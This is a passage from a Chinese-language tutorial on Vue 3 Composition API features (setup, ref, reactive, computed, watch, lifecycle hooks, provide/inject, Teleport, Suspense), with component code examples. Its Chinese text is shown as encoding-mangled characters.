ä¸èƒ½æ˜¯ä¸€å€‹ async å‡½å¼ï¼Œå› ç‚ºè¿”å›å€¼ä¸å†æ˜¯ return çš„ç‰©ä»¶ï¼Œè€Œæ˜¯ promiseï¼Œtemplate ä¸­å°±ä¸å¯ä»¥ä½¿ç”¨ return ä¸­è¿”å›ç‰©ä»¶çš„è³‡æ–™äº†ã€‚\nsetup çš„åƒæ•¸(^1.^props, ^2.^context)ï¼š\npropsï¼šæ˜¯ä¸€å€‹ç‰©ä»¶ï¼Œè£¡é¢æœ‰çˆ¶ç´šå…ƒä»¶å‘å­ç´šå…ƒä»¶å‚³éçš„è³‡æ–™ï¼Œä¸¦ä¸”æ˜¯åœ¨å­ç´šå…ƒä»¶ä¸­ä½¿ç”¨ props æ¥æ”¶åˆ°çš„æ‰€æœ‰çš„å±¬æ€§ã€‚ contextï¼šä¸Šä¸‹æ–‡ç‰©ä»¶ï¼Œå¯ä»¥é€šé es6 èªæ³•è§£æ§‹ setup(props, {^(a).^attrs, ^(b).^slots, ^(c).^emit})\n\u0026gt; a). attrsï¼šç²å–ç•¶å‰å…ƒä»¶æ¨™ç±¤ä¸Šæ‰€æœ‰æ²’æœ‰é€šé props æ¥æ”¶çš„å±¬æ€§çš„ç‰©ä»¶ï¼Œç›¸ç•¶æ–¼ this.$attrsã€‚\n\u0026gt; b). slotsï¼šåŒ…å«æ‰€æœ‰å‚³å…¥çš„æ’æ§½å…§å®¹çš„ç‰©ä»¶ï¼Œç›¸ç•¶æ–¼ this.$slotsã€‚\n\u0026gt; c). emitï¼šç”¨ä¾†åˆ†ç™¼è‡ªå®šç¾©äº‹ä»¶çš„å‡½å¼ï¼Œç›¸ç•¶æ–¼ this.$emitã€‚ æ¼”ç¤º attrs å’Œ propsï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;template\u0026gt; \u0026lt;child :msg=\u0026#34;msg\u0026#34; msg2=\u0026#39;å“ˆå“ˆå“ˆ\u0026#39; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent, ref } from \u0026#39;vue\u0026#39;; // å¼•å…¥å­å…ƒä»¶ import Child from \u0026#39;./components/Child.vue\u0026#39;; export default defineComponent({ name: \u0026#39;App\u0026#39;, components: { Child, }, setup() { const msg = ref(\u0026#39;hello,vue3\u0026#39;); return { msg, }; }, }); \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;å­å…ƒä»¶\u0026lt;/h2\u0026gt; \u0026lt;h3\u0026gt;msg:{{ msg }}\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;Child\u0026#39;, props: [\u0026#39;msg\u0026#39;], setup(props, {attrs, slots, emit}) { console.log(\u0026#39;props:\u0026#39;, props); // msg: \u0026#34;hello,vue3\u0026#34; console.log(\u0026#39;attrs:\u0026#39;, attrs); // msg2: \u0026#34;å“ˆå“ˆå“ˆ\u0026#34; return {}; }, }); \u0026lt;/script\u0026gt; æ¼”ç¤º emitï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;child @click=\u0026#34;show\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; setup() { const show = () =\u0026gt; { console.log(\u0026#39;name:\u0026#39;, \u0026#39;hzw\u0026#39;); }; return { show, }; }, \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;button\u0026gt;äº‹ä»¶åˆ†ç™¼\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;Child\u0026#39;, setup(props, { emit }) { const emitFn = () =\u0026gt; { emit(\u0026#39;show\u0026#39;); }; return { emitFn, }; }, }); \u0026lt;/script\u0026gt; ref ä½œç”¨ï¼šå®šç¾©ä¸€å€‹éŸ¿æ‡‰å¼çš„è³‡æ–™(ä¸€èˆ¬ç”¨ä¾†å®šç¾©ä¸€å€‹åŸºæœ¬å‹åˆ¥çš„éŸ¿æ‡‰å¼è³‡æ–™ Undefinedã€Nullã€Booleanã€Numberã€String) èªæ³•ï¼š 1 const xxx = ref(initValue); æ³¨æ„ï¼šscript ä¸­æ“ä½œè³‡æ–™éœ€è¦ä½¿ç”¨ xxx.value çš„å½¢å¼ï¼Œè€Œ template ä¸­ä¸éœ€è¦æ–°å¢ .value ç”¨ä¸€å€‹ä¾‹å­ä¾†æ¼”ç¤ºï¼Œå¯¦ç¾ä¸€å€‹æŒ‰éˆ•ï¼Œé»é¸å¯ä»¥å¢åŠ æ•¸å­—ï¼š\naddNum.vue 1 2 3 4 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{count}}\u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#39;updateCount\u0026#39;\u0026gt;å¢åŠ \u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; åœ¨ Vue2 ä¸­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script\u0026gt; // ... data() { return { conunt: 0, }; }, methods: { updateCount() { this.conunt++; }, }, // ... \u0026lt;/script\u0026gt; åœ¨ Vue3 ä¸­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;script\u0026gt; // ... setup() { // ref ç”¨æ–¼å®šç¾©ä¸€å€‹éŸ¿æ‡‰å¼çš„è³‡æ–™ï¼Œè¿”å›çš„æ˜¯ä¸€å€‹ Ref ç‰©ä»¶ï¼Œç‰©ä»¶ä¸­æœ‰ä¸€å€‹ value å±¬æ€§ // å¦‚æœéœ€è¦å°è³‡æ–™é€²è¡Œæ“ä½œï¼Œéœ€è¦ä½¿ç”¨è©² Ref ç‰©ä»¶çš„ value å±¬æ€§ const count = ref(0); function updateCount() { count.value++; } return { count, updateCount }; }, // ... \u0026lt;/script\u0026gt; åœ¨ Vue2 ä¸­æˆ‘å€‘é€šé this.$refs ä¾†ç²å– dom ç¯€é»ï¼ŒVue3 ä¸­æˆ‘å€‘é€šé ref ä¾†ç²å–ç¯€é»ã€‚\né¦–å…ˆéœ€è¦åœ¨æ¨™ç±¤ä¸Šæ–°å¢ ref='xxx'ï¼Œç„¶å¾Œå† setup ä¸­å®šç¾©ä¸€å€‹åˆå§‹å€¼ç‚º null çš„ ref å‹åˆ¥ï¼Œåå­—è¦å’Œæ¨™ç±¤çš„ ref å±¬æ€§ä¸€è‡´ã€‚\n1 const xxx = ref(null) æ³¨æ„ ï¼šä¸€å®šè¦åœ¨ setup çš„ return ä¸­è¿”å›ï¼Œä¸ç„¶æœƒå ±éŒ¯ã€‚\nç”¨ä¸€å€‹ä¾‹å­ä¾†æ¼”ç¤ºï¼Œè®“è¼¸å…¥æ¡†è‡ªå‹•ç²å–ç„¦é»ï¼š\nautoFocus.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;App\u0026lt;/h2\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34;\u0026gt;--- \u0026lt;input type=\u0026#34;text\u0026#34; ref=\u0026#34;inputRef\u0026#34;\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { onMounted, ref } from \u0026#39;vue\u0026#39; /* refç²å–å…ƒç´ : åˆ©ç”¨ ref å‡½å¼ç²å–å…ƒä»¶ä¸­çš„æ¨™ç±¤å…ƒç´  åŠŸèƒ½éœ€æ±‚: è®“è¼¸å…¥æ¡†è‡ªå‹•ç²å–ç„¦é» */ export default { setup() { const inputRef = ref\u0026lt;HTMLElement|null\u0026gt;(null) onMounted(() =\u0026gt; { inputRef.value \u0026amp;\u0026amp; inputRef.value.focus() }) return { inputRef } }, } \u0026lt;/script\u0026gt; reactive ä½œç”¨ï¼šå®šç¾©å¤šå€‹æ•¸æ“šçš„éŸ¿æ‡‰å¼ï¼Œæ¥æ”¶ä¸€å€‹æ™®é€šç‰©ä»¶ç„¶å¾Œè¿”å›è©²æ™®é€šç‰©ä»¶çš„éŸ¿æ‡‰å¼ä»£ç†å™¨ç‰©ä»¶(Proxy)ï¼ŒéŸ¿æ‡‰å¼è½‰æ›æ˜¯\u0026quot;æ·±å±¤çš„\u0026quot;ï¼šæœƒå½±éŸ¿ç‰©ä»¶å…§éƒ¨æ‰€æœ‰å·¢ç‹€çš„å±¬æ€§ï¼Œæ‰€æœ‰çš„è³‡æ–™éƒ½æ˜¯éŸ¿æ‡‰å¼çš„ã€‚ èªæ³•ï¼š 1 const proxy = reactive(obj) ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;template\u0026gt; \u0026lt;h3\u0026gt;å§“å:{{user.name}}\u0026lt;/h3\u0026gt; \u0026lt;h3\u0026gt;å¹´é½¡:{{user.age}}\u0026lt;/h3\u0026gt; \u0026lt;h3\u0026gt;wife:{{user.wife}}\u0026lt;/h3\u0026gt; \u0026lt;button @click=\u0026#34;updateUser\u0026#34;\u0026gt;æ›´æ–°\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; // ... setup() { const user = reactive({ name: \u0026#39;hzw\u0026#39;, age: 18, wife: { name: \u0026#39;xioaohong\u0026#39;, age: 18, books: [\u0026#39;ç´…å¯¶æ›¸\u0026#39;, \u0026#39;è¨­è¨ˆæ¨¡å¼\u0026#39;, \u0026#39;æ¼”ç®—æ³•èˆ‡è³‡æ–™çµæ§‹\u0026#39;], }, }); const updateUser = () =\u0026gt; { user.name = \u0026#39;å°ç´…\u0026#39;; user.age += 2; user.wife.books[0] = \u0026#39;é‡‘ç“¶æ¢…\u0026#39;; }; return { user, updateUser, }; }, // ... \u0026lt;/script\u0026gt; computed èˆ‡ Vue2 ä¸­çš„ computed é…ç½®åŠŸèƒ½ä¸€è‡´ï¼Œè¿”å›çš„æ˜¯ä¸€å€‹ ref å‹åˆ¥çš„ç‰©ä»¶ã€‚ computed çš„å‡½å¼ä¸­å¦‚æœåªå‚³å…¥ä¸€å€‹ç®­é ­å‡½å¼ è¡¨ç¤ºçš„æ˜¯ get æ“ä½œï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 import { computed } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;éŸ“\u0026#39;, lastName: \u0026#39;å¿—å‰\u0026#39;, }); const fullName1 = computed(() =\u0026gt; { return user.firstName + user.lastName; }); return { user, fullName1, }; computed çš„å‡½å¼ä¸­å¯ä»¥å‚³å…¥ä¸€å€‹ç‰©ä»¶ï¼Œå¯ä»¥åŒ…å« set å’Œ get å‡½å¼ï¼Œé€²è¡Œè®€å–å’Œä¿®æ”¹çš„æ“ä½œï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import { computed } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;éŸ“\u0026#39;, lastName: \u0026#39;å¿—å‰\u0026#39;, }); const fullName2 = computed({ get() { return user.firstName + \u0026#39;_\u0026#39; + user.lastName; }, set(val: string) { const names = val.split(\u0026#39;_\u0026#39;); user.firstName = names[0]; user.lastName = names[1]; }, }); return { user, fullName2, }; watch èˆ‡ Vue2 ä¸­çš„ watch é…ç½®åŠŸèƒ½ä¸€è‡´ã€‚ ä½œç”¨ï¼šç›£è¦–æŒ‡å®šçš„ä¸€å€‹æˆ–å¤šå€‹éŸ¿æ‡‰å¼è³‡æ–™ï¼Œä¸€æ—¦è³‡æ–™è®ŠåŒ–ï¼Œå°±è‡ªå‹•åŸ·è¡Œç›£è¦–å›æ’¥ã€‚ èªæ³•ï¼šwatch(è¦ç›£è½çš„è³‡æ–™, å›èª¿å‡½å¼, é…ç½®) é è¨­åˆå§‹æ™‚ä¸åŸ·è¡Œå›èª¿ï¼Œä½†å¯ä»¥é€šéé…ç½®çš„ immediate ç‚º trueï¼Œä¾†æŒ‡å®šåˆå§‹æ™‚ç«‹å³åŸ·è¡Œç¬¬ä¸€æ¬¡ã€‚ é€šéé…ç½®çš„ deep ç‚º trueï¼Œä¾†æŒ‡å®šæ·±åº¦ç›£è¦–ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import { watch, ref } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;éŸ“\u0026#39;, lastName: \u0026#39;å¿—å‰\u0026#39;, }); const fullName3 = ref(\u0026#39;\u0026#39;); watch( user, ({ firstName, lastName }) =\u0026gt; { fullName3.value = firstName + \u0026#39;_\u0026#39; + lastName; }, { immediate: true, deep: true } ); return { user, fullName3, }; watch ç›£è½å¤šå€‹æ•¸æ“šï¼Œä½¿ç”¨é™£åˆ—ã€‚\nwatch ç›£è½ééŸ¿æ‡‰å¼è³‡æ–™çš„æ™‚å€™éœ€è¦ä½¿ç”¨å›èª¿å‡½å¼çš„å½¢å¼ã€‚\n1 2 3 4 5 6 7 8 9 10 watch( [ () =\u0026gt; user.firstName, () =\u0026gt; user.lastName, fullName3 ], () =\u0026gt; { console.log(\u0026#39;æˆ‘åŸ·è¡Œäº†\u0026#39;) } ) watchEffect ä½œç”¨ï¼šç›£è¦–è³‡æ–™ç™¼ç”Ÿè®ŠåŒ–æ™‚åŸ·è¡Œå›èª¿ï¼Œä¸ç”¨ç›´æ¥æŒ‡å®šè¦ç›£è¦–çš„è³‡æ–™ï¼Œå›èª¿å‡½å¼ä¸­ä½¿ç”¨çš„å“ªäº›éŸ¿æ‡‰å¼è³‡æ–™å°±ç›£è¦–å“ªäº›éŸ¿æ‡‰å¼è³‡æ–™ï¼Œé è¨­åˆå§‹æ™‚å°±æœƒåŸ·è¡Œç¬¬ä¸€æ¬¡ï¼Œå¾è€Œå¯ä»¥æ”¶é›†éœ€è¦ç›£è¦–çš„è³‡æ–™ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { watchEffect, ref } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;éŸ“\u0026#39;, lastName: \u0026#39;å¿—å‰\u0026#39;, }); const fullName4 = ref(\u0026#39;\u0026#39;); watchEffect(() =\u0026gt; { fullName4.value = user.firstName + \u0026#39;_\u0026#39; + user.lastName; }); return { user, fullName4, }; // watchEffectå¯ä»¥å¯¦ç¾è¨ˆç®—å±¬æ€§setæ–¹æ³• watchEffect(() =\u0026gt; { const names = fullName3.value.split(\u0026#39;_\u0026#39;); user.firstName = names[0]; user.lastName = names[1]; }); ç”Ÿå‘½é€±æœŸå°æ¯”ï¼š\næ³¨æ„ï¼š3.0 ä¸­çš„ç”Ÿå‘½é€±æœŸé‰¤å­è¦æ¯” 2.X ä¸­ç›¸åŒç”Ÿå‘½é€±æœŸçš„é‰¤å­è¦å¿«ã€‚ Composition API é‚„æ–°å¢äº†ä»¥ä¸‹ç”¨æ–¼é™¤éŒ¯çš„é‰¤å­å‡½å¼ï¼Œä½†æ˜¯ä¸æ€éº¼å¸¸ç”¨ï¼šonRenderTrackedã€onRenderTriggeredã€‚ ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 setup() { onBeforeMount(() =\u0026gt; { console.log(\u0026#39;--onBeforeMount\u0026#39;) }) onMounted(() =\u0026gt; { console.log(\u0026#39;--onMounted\u0026#39;) }) onBeforeUpdate(() =\u0026gt; { console.log(\u0026#39;--onBeforeUpdate\u0026#39;) }) onUpdated(() =\u0026gt; { console.log(\u0026#39;--onUpdated\u0026#39;) }) onBeforeUnmount(() =\u0026gt; { console.log(\u0026#39;--onBeforeUnmount\u0026#39;) }) onUnmounted(() =\u0026gt; { console.log(\u0026#39;--onUnmounted\u0026#39;) }) } toRefs ä½œç”¨ï¼šæŠŠä¸€å€‹éŸ¿æ‡‰å¼ç‰©ä»¶è½‰æ›æˆæ™®é€šç‰©ä»¶ï¼Œè©²æ™®é€šç‰©ä»¶çš„æ¯å€‹å±¬æ€§éƒ½æ˜¯ä¸€å€‹ refã€‚ æ‡‰ç”¨ï¼šæˆ‘å€‘ä½¿ç”¨ reactive å»ºç«‹çš„ç‰©ä»¶ï¼Œå¦‚æœæƒ³åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ï¼Œå°±å¿…é ˆå¾—ä½¿ç”¨ xxx.xxx çš„å½¢å¼ï¼Œå¦‚æœå¤§é‡ç”¨åˆ°çš„è©±é‚„æ˜¯å¾ˆéº»ç…©çš„ï¼Œä½†æ˜¯ä½¿ç”¨ es6 è§£æ§‹ä»¥å¾Œï¼Œæœƒå¤±å»éŸ¿æ‡‰å¼ï¼Œé‚£éº¼ toRefs çš„ä½œç”¨å°±é«”ç¾åœ¨é€™ï¼Œåˆ©ç”¨ toRefs å¯ä»¥å°‡ä¸€å€‹éŸ¿æ‡‰å¼ reactive ç‰©ä»¶çš„æ‰€æœ‰åŸå§‹å±¬æ€§è½‰æ›ç‚ºéŸ¿æ‡‰å¼çš„ ref å±¬æ€§ã€‚ç•¶ç„¶å°å¤¥ä¼´å€‘å¯ä»¥è‡ªè¡Œé–‹ç™¼æ›´å¤šæ‡‰ç”¨å ´æ™¯ã€‚ ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; name:{{name}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent, reactive, toRefs } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;\u0026#39;, setup() { const state = reactive({ name: \u0026#39;hzw\u0026#39;, }); const state2 = toRefs(state); setInterval(() =\u0026gt; { state.name += \u0026#39;===\u0026#39;; }, 1000); return { // é€šé toRefs è¿”å›çš„ç‰©ä»¶ï¼Œè§£æ§‹å‡ºä¾†çš„å±¬æ€§ä¹Ÿæ˜¯éŸ¿æ‡‰å¼çš„ ...state2, }; }, }); \u0026lt;/script\u0026gt; provide èˆ‡ inject ä½œç”¨ï¼šå¯¦ç¾è·¨å±¤ç´šå…ƒä»¶(ç¥–å­«)é–“é€šè¨Šã€‚ ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;h1\u0026gt;çˆ¶å…ƒä»¶\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;ç•¶å‰é¡è‰²: {{color}}\u0026lt;/p\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;red\u0026#39;\u0026#34;\u0026gt;ç´…\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;yellow\u0026#39;\u0026#34;\u0026gt;é»ƒ\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;blue\u0026#39;\u0026#34;\u0026gt;è—\u0026lt;/button\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;Son /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { provide, ref } from \u0026#39;vue\u0026#39; import Son from \u0026#39;./son.vue\u0026#39; export default { name: \u0026#39;ProvideInject\u0026#39;, components: { Son }, setup() { const color = ref(\u0026#39;red\u0026#39;) provide(\u0026#39;color\u0026#39;, color) return { color } } } \u0026lt;/script\u0026gt; son.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;å­å…ƒä»¶\u0026lt;/h2\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;GrandSon /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import GrandSon from \u0026#39;./grandson.vue\u0026#39; export default { components: { GrandSon }, } \u0026lt;/script\u0026gt; grandson.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;h3 :style=\u0026#34;{color}\u0026#34;\u0026gt;å­«å­å…ƒä»¶: {{color}}\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { inject } from \u0026#39;vue\u0026#39; export default { setup() { const color = inject(\u0026#39;color\u0026#39;) return { color } } } \u0026lt;/script\u0026gt; å…¶ä»–ç‰¹æ€§ Teleport(ç¬ç§») ä½œç”¨ï¼šTeleport æä¾›äº†ä¸€ç¨®ä¹¾æ·¨çš„æ–¹æ³•ï¼Œè®“å…ƒä»¶çš„ html åœ¨çˆ¶å…ƒä»¶ä»‹é¢å¤–çš„ç‰¹å®šæ¨™ç±¤(å¾ˆå¯èƒ½æ˜¯ body )ä¸‹æ’å…¥é¡¯ç¤ºï¼Œæ›å¥è©±èªªå°±æ˜¯å¯ä»¥æŠŠå­å…ƒä»¶æˆ–è€…domç¯€é»æ’å…¥åˆ°ä»»ä½•ä½ æƒ³æ’å…¥åˆ°çš„åœ°æ–¹å»ã€‚ èªæ³•ï¼šä½¿ç”¨ to å±¬æ€§ï¼Œå¼•è™Ÿå…§ä½¿ç”¨é¸æ“‡å™¨ã€‚ 1 \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt;\u0026lt;/teleport\u0026gt; ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;father\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;App\u0026lt;/h2\u0026gt; \u0026lt;modal-button\u0026gt;\u0026lt;/modal-button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import ModalButton from \u0026#39;./components/ModalButton.vue\u0026#39; export default { setup() { return {} }, components: { ModalButton, }, } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;son\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;modalOpen = true\u0026#34;\u0026gt; é»æˆ‘é–‹å•Ÿå°è©±æ–¹å¡Š \u0026lt;/button\u0026gt; \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt; \u0026lt;div v-if=\u0026#34;modalOpen\u0026#34; class=\u0026#34;looklook\u0026#34;\u0026gt; çœ‹çœ‹æˆ‘å‡ºç¾åœ¨äº†å“ªè£¡ \u0026lt;button @click=\u0026#34;modalOpen = false\u0026#34;\u0026gt; Close \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/teleport\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { name: \u0026#39;modal-button\u0026#39;, setup() { const modalOpen = ref(false) return { modalOpen, } }, } \u0026lt;/script\u0026gt; å¯ä»¥çœ‹åˆ°åœ¨å­å…ƒä»¶ä¸­çš„ looklook å…ƒç´ è·‘åˆ°äº† body ä¸‹é¢ï¼Œè€Œä¹‹å‰çš„ä½ç½®é»˜èªå‡ºç¾äº†å…©è¡Œè¨»é‡‹ã€‚\nSuspense(ä¸ç¢ºå®šçš„) ä½œç”¨ï¼šå®ƒå€‘å…è¨±æˆ‘å€‘çš„æ‡‰ç”¨ç¨‹å¼åœ¨ç­‰å¾…éåŒæ­¥å…ƒä»¶æ™‚æ¸²æŸ“ä¸€äº›å¾Œå‚™å…§å®¹ï¼Œå¯ä»¥è®“æˆ‘å€‘å»ºç«‹ä¸€å€‹å¹³æ»‘çš„ä½¿ç”¨è€…é«”é©—ã€‚ èªæ³•ï¼š 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;Suspense\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;!-- éåŒæ­¥å…ƒä»¶ --\u0026gt; \u0026lt;AsyncComp /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;!-- å¾Œå‚™å…§å®¹ --\u0026gt; \u0026lt;h1\u0026gt;LOADING...\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; vue3 ä¸­å¼•å…¥éåŒæ­¥å…ƒä»¶çš„æ–¹å¼ï¼š\n1 const AsyncComp = defineAsyncComponent(() =\u0026gt; import(\u0026#39;./AsyncComp.vue\u0026#39;)) ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;Suspense\u0026gt; \u0026lt;!-- v-slot:defaul å¯ä»¥ç°¡å¯«æˆ #defaul --\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;AsyncComp/\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;!-- v-slot:defaul å¯ä»¥ç°¡å¯«æˆ #fallback --\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;h1\u0026gt;LOADING...\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { defineAsyncComponent } from \u0026#39;vue\u0026#39; const AsyncComp = defineAsyncComponent(() =\u0026gt; import(\u0026#39;./AsyncComp.vue\u0026#39;)) export default { setup() { return { } }, components: { AsyncComp, } } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;AsyncComp22\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;{{msg}}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; export default { name: \u0026#39;AsyncComp\u0026#39;, setup () { return new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { resolve({ msg: \u0026#39;abc\u0026#39; }) }, 2000) }) } } \u0026lt;/script\u0026gt; é€šéä¸‹åœ–å¯ä»¥çœ‹åˆ°åœ¨éåŒæ­¥å…ƒä»¶åŠ è¼‰å‡ºä¾†ä¹‹å‰ï¼Œé¡¯ç¤ºçš„æ˜¯ fallback ä¸­çš„å…§å®¹ï¼š\néŸ¿æ‡‰å¼è³‡æ–™çš„åˆ¤æ–· ä½œç”¨ isRefï¼šæª¢æŸ¥ä¸€å€‹å€¼æ˜¯å¦ç‚ºä¸€å€‹ ref ç‰©ä»¶ isReactiveï¼šæª¢æŸ¥ä¸€å€‹ç‰©ä»¶æ˜¯å¦æ˜¯ç”± reactive å»ºç«‹çš„éŸ¿æ‡‰å¼ä»£ç† isReadonlyï¼šæª¢æŸ¥ä¸€å€‹ç‰©ä»¶æ˜¯å¦æ˜¯ç”± readonly å»ºç«‹çš„åªè®€ä»£ç† isProxyï¼šæª¢æŸ¥ä¸€å€‹ç‰©ä»¶æ˜¯å¦æ˜¯ç”± reactive æˆ–è€… readonly æ–¹æ³•å»ºç«‹çš„ä»£ç† ç¨‹å¼ç¢¼æ¼”ç¤º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 setup() { const state1 = ref(1); console.log(\u0026#39;isref:\u0026#39;, isRef(state1)); // isref: true const state2 = reactive({}); console.log(\u0026#39;isReactive:\u0026#39;, isReactive(state2)); // isReactive: true const state3 = readonly({}); console.log(\u0026#39;isReadonly:\u0026#39;, isReadonly(state3)); // isReadonly: true const state4 = reactive({}); console.log(\u0026#39;isProxy:\u0026#39;, isProxy(state2)); // isProxy: true console.log(\u0026#39;isProxy:\u0026#39;, isProxy(state4)); // isProxy: true return {}; }, å…¶ä»–ä¸å¸¸ç”¨ç‰¹æ€§ é‚„æœ‰å¾ˆå¤šå¾ˆå¤šä¸å¸¸ç”¨çš„æ–°ç‰¹æ€§ï¼Œæˆ‘åœ¨æ—¥å¸¸é–‹ç™¼ä¸­æ˜¯æ²’æœ‰ç”¨åˆ°çš„ï¼Œå¾ˆå¤šéƒ½æ˜¯ç”¨ä¾†åšå„ªåŒ–çš„ï¼Œæ„Ÿèˆˆè¶£çš„å°å¤¥ä¼´å€‘è‡ªè¡Œå»å®˜ç¶²æª¢è¦–ï¼Œæˆ–è€…å¤§ä½¬å€‘å¯ä»¥ä»‹ç´¹ä¸€ä¸‹æ‡‰ç”¨å ´æ™¯ã€‚\nshallowReactive shallowRef readonly shallowReadonly markRaw customRef \u0026hellip; èªæ³•ç³– é›–ç„¶ Composition API 